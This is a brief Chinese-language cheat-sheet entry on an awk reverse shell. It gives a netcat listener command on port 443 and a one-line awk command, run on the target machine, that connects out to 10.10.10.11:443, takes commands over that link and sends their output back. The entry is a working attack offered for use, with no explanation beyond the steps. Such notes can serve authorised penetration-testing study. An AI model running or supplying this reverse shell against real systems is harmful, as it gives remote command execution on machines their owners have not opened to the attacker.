# Awk反弹shell

首先在本地监听TCP协议443端口

```bash
nc -lvp 443

```

然后在靶机上执行如下命令：

```bash
awk 'BEGIN {s = "/inet/tcp/0/10.10.10.11/443"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null

```

